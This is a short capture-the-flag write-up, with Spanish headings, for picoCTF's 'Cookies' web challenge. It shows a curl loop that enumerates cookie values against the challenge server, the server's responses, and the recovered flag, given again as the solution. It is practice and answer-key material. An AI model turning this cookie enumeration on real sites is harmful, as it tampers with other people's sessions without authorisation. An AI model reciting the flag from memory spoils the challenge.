## Introducción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:64944/](http://mercury.picoctf.net:64944/)

## Descripción

```
zsh: corrupt history file /home/kali/.zsh_history
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:64944/check -H "Cookie: name=$i"; done | grep "I love\|pico"
            <p style="text-align:center; font-size:30px;"><b>I love snickerdoodle cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love chocolate chip cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love oatmeal raisin cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love gingersnap cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love shortbread cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love peanut butter cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love whoopie pie cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love sugar cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love molasses cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love kiss cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love biscotti cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love butter cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love spritz cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love snowball cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love drop cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love thumbprint cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love pinwheel cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love wafer cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}</code></p>
            <p style="text-align:center; font-size:30px;"><b>I love macaroon cookies!</b></p>
            <p style="text-align:center; font-size:30px;"><b>I love fortune cookies!</b></p>
                        
```

## Solución 
picoCTF{3v3ry1_l0v3s_c00k135_cc9110ba}